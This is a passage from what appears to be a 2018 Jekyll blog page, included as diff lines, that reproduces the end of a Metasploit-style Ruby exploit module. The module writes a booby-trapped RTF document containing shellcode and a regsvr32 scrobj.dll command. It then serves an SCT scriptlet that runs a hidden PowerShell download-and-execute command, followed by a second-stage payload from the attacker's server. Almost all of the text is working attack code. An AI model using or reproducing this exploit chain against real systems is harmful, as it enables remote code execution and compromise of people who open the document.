+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"00000000</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s2">"}}}</span><span class="se">\n</span><span class="s2">"</span>
+    <span class="n">footer</span> <span class="o">&lt;&lt;</span> <span class="s1">'\par}'</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x1c\x00\x00\x00\x02\x00\x9e\xc4\xa9\x00\x00\x00\x00\x00\x00\x00\xc8\xa7\\\x00\xc4\xee</span><span class="s2">[</span><span class="se">\x00\x00\x00\x00\x00\x03\x01\x01\x03\n\n\x01\x08</span><span class="s2">ZZ"</span>
+    <span class="n">shellcode</span> <span class="o">&lt;&lt;</span> <span class="s2">"</span><span class="se">\xB8\x44\xEB\x71\x12\xBA\x78\x56\x34\x12\x31\xD0\x8B\x08\x8B\x09\x8B\x09\x66\x83\xC1\x3C\x31\xDB\x53\x51\xBE\x64\x3E\x72\x12\x31\xD6\xFF\x16\x53\x66\x83\xEE\x4C\xFF\x10</span><span class="s2">"</span>
+    <span class="n">shellcode</span> <span class="o">&lt;&lt;</span> <span class="s2">"</span><span class="se">\x90\x90</span><span class="s2">"</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="p">[</span><span class="mh">0x00402114</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"V"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="mi">2</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s2">"regsvr32 /s /n /u /i:</span><span class="si">#{</span><span class="n">get_uri</span><span class="si">}</span><span class="s2">.sct scrobj.dll"</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">197</span> <span class="o">-</span> <span class="n">payload</span><span class="p">.</span><span class="nf">length</span><span class="p">))).</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">).</span><span class="nf">first</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">footer</span>
+
+    <span class="n">rtf</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'FILENAME'</span><span class="p">],</span> <span class="s1">'w'</span><span class="p">)</span>
+    <span class="n">rtf</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">rtf</span><span class="p">.</span><span class="nf">close</span>
+    <span class="n">rtf</span>
+  <span class="k">end</span>
+
+
+
+  <span class="k">def</span> <span class="nf">gen_psh</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="o">*</span><span class="nb">method</span><span class="p">)</span>
+    <span class="n">ignore_cert</span> <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Powershell</span><span class="o">::</span><span class="no">PshMethods</span><span class="p">.</span><span class="nf">ignore_ssl_certificate</span> <span class="k">if</span> <span class="n">ssl</span>
+
+    <span class="k">if</span> <span class="nb">method</span><span class="p">.</span><span class="nf">include?</span> <span class="s1">'string'</span>
+      <span class="n">download_string</span> <span class="o">=</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'PSH-Proxy'</span><span class="p">]</span> <span class="p">?</span> <span class="p">(</span><span class="no">Rex</span><span class="o">::</span><span class="no">Powershell</span><span class="o">::</span><span class="no">PshMethods</span><span class="p">.</span><span class="nf">proxy_aware_download_and_exec_string</span><span class="p">(</span><span class="n">url</span><span class="p">))</span> <span class="p">:</span> <span class="p">(</span><span class="no">Rex</span><span class="o">::</span><span class="no">Powershell</span><span class="o">::</span><span class="no">PshMethods</span><span class="p">.</span><span class="nf">download_and_exec_string</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+    <span class="k">else</span>
+      <span class="c1"># Random filename to use, if there isn't anything set</span>
+      <span class="n">random</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">rand_text_alphanumeric</span> <span class="mi">8</span><span class="si">}</span><span class="s2">.exe"</span>
+      <span class="c1"># Set filename (Use random filename if empty)</span>
+      <span class="n">filename</span> <span class="o">=</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'BinaryEXE-FILENAME'</span><span class="p">].</span><span class="nf">blank?</span> <span class="p">?</span> <span class="n">random</span> <span class="p">:</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'BinaryEXE-FILENAME'</span><span class="p">]</span>
+
+      <span class="c1"># Set path (Use %TEMP% if empty)</span>
+      <span class="n">path</span> <span class="o">=</span> <span class="n">datastore</span><span class="p">[</span><span class="s1">'BinaryEXE-PATH'</span><span class="p">].</span><span class="nf">blank?</span> <span class="p">?</span> <span class="s2">"$env:temp"</span> <span class="p">:</span> <span class="sx">%Q('</span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'BinaryEXE-PATH'</span><span class="p">]</span><span class="si">}</span><span class="sx">')</span>
+
+      <span class="c1"># Join Path and Filename</span>
+      <span class="n">file</span> <span class="o">=</span> <span class="sx">%Q(echo (</span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="sx">+'</span><span class="se">\\</span><span class="si">#{</span><span class="n">filename</span><span class="si">}</span><span class="sx">'))</span>
+
+      <span class="c1"># Generate download PowerShell command</span>
+      <span class="n">download_string</span> <span class="o">=</span> <span class="no">Rex</span><span class="o">::</span><span class="no">Powershell</span><span class="o">::</span><span class="no">PshMethods</span><span class="p">.</span><span class="nf">download_run</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="n">download_and_run</span> <span class="o">=</span> <span class="s2">"</span><span class="si">#{</span><span class="n">ignore_cert</span><span class="si">}#{</span><span class="n">download_string</span><span class="si">}</span><span class="s2">"</span>
+
+    <span class="c1"># Generate main PowerShell command</span>
+    <span class="k">return</span> <span class="n">generate_psh_command_line</span><span class="p">(</span><span class="ss">noprofile: </span><span class="kp">true</span><span class="p">,</span> <span class="ss">windowstyle: </span><span class="s1">'hidden'</span><span class="p">,</span> <span class="ss">command: </span><span class="n">download_and_run</span><span class="p">)</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">on_request_uri</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">_request</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">_request</span><span class="p">.</span><span class="nf">raw_uri</span> <span class="o">=~</span> <span class="sr">/\.sct$/</span>
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Handling initial request from </span><span class="si">#{</span><span class="n">cli</span><span class="p">.</span><span class="nf">peerhost</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+      <span class="n">payload</span> <span class="o">=</span> <span class="n">gen_psh</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">get_uri</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"string"</span><span class="p">)</span>
+      <span class="n">data</span> <span class="o">=</span> <span class="n">gen_sct_file</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+      <span class="n">send_response</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="s1">'Content-Type'</span> <span class="o">=&gt;</span> <span class="s1">'text/plain'</span><span class="p">)</span>
+    <span class="k">else</span>
+      <span class="n">print_status</span><span class="p">(</span><span class="s2">"Stage two requested, sending..."</span><span class="p">)</span>
+      <span class="nb">p</span> <span class="o">=</span> <span class="n">regenerate_payload</span><span class="p">(</span><span class="n">cli</span><span class="p">)</span>
+      <span class="n">data</span> <span class="o">=</span> <span class="n">cmd_psh_payload</span><span class="p">(</span><span class="nb">p</span><span class="p">.</span><span class="nf">encoded</span><span class="p">,</span>
+                       <span class="n">payload_instance</span><span class="p">.</span><span class="nf">arch</span><span class="p">.</span><span class="nf">first</span><span class="p">,</span>
+                       <span class="ss">remove_comspec: </span><span class="kp">true</span><span class="p">,</span>
+                       <span class="ss">exec_in_place: </span><span class="kp">true</span>
+      <span class="p">)</span>
+      <span class="n">send_response</span><span class="p">(</span><span class="n">cli</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="s1">'Content-Type'</span> <span class="o">=&gt;</span> <span class="s1">'application/octet-stream'</span><span class="p">)</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+
+  <span class="k">def</span> <span class="nf">rand_class_id</span>
+    <span class="s2">"</span><span class="si">#{</span><span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">rand_text_hex</span> <span class="mi">8</span><span class="si">}</span><span class="s2">-</span><span class="si">#{</span><span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">rand_text_hex</span> <span class="mi">4</span><span class="si">}</span><span class="s2">-</span><span class="si">#{</span><span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">rand_text_hex</span> <span class="mi">4</span><span class="si">}</span><span class="s2">-</span><span class="si">#{</span><span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">rand_text_hex</span> <span class="mi">4</span><span class="si">}</span><span class="s2">-</span><span class="si">#{</span><span class="no">Rex</span><span class="o">::</span><span class="no">Text</span><span class="p">.</span><span class="nf">rand_text_hex</span> <span class="mi">12</span><span class="si">}</span><span class="s2">"</span>
+  <span class="k">end</span>
+
+
+  <span class="k">def</span> <span class="nf">gen_sct_file</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+    <span class="c1"># If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).</span>
+    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s1">''</span>
+      <span class="k">return</span> <span class="sx">%{&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"&gt;&lt;/registration&gt;&lt;/scriptlet&gt;}</span>
+    <span class="c1"># If a command is provided, tell the target system to execute it.</span>
+    <span class="k">else</span>
+      <span class="k">return</span> <span class="sx">%{&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="#{Rex::Text.rand_text_alphanumeric 8}" classid="{#{rand_class_id}}"&gt;&lt;script&gt;&lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("#{command}",0);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;}</span>
+    <span class="k">end</span>
+  <span class="k">end</span>
+
+
+  <span class="k">def</span> <span class="nf">primer</span>
+    <span class="n">generate_rtf</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
